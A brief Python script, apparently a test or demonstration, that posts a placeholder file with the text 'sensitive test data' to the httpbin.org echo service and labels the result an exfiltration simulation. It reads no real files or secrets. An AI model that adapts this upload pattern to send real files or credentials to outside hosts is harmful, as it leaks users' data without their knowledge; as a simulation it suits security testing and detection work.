import requests

file_data = {
    "file": ("data.txt", "sensitive test data")
}

response = requests.post("https://httpbin.org/post", files=file_data)

print("Exfiltration simulation status:", response.status_code)
